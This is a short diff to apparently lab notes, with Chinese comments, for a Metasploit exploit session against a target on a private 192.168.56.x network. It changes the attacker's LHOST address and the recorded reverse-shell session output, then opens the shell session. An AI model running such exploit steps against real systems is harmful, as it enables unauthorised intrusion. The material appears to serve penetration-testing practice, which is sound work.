@@ -65,7 +65,7 @@ set RHOSTS 192.168.56.175
 # 靶机目标端口
 set rport  12862          
 # 攻击者主机 IP
-set LHOST  192.168.56.214 
+set LHOST  192.168.56.162 
 
 # 再次检查 exp 配置参数列表
 show options
@@ -81,7 +81,7 @@ sessions -l
 # 
 #   Id  Name  Type            Information  Connection
 #   --  ----  ----            -----------  ----------
-#   1         shell cmd/unix               192.168.56.214:4444 -> 192.168.56.175:60690  (192.168.56.175)
+#   1         shell cmd/unix               192.168.56.162:4444 -> 192.168.56.175:60690  (192.168.56.175)
 
 # 进入会话 1
 sessions -i 1
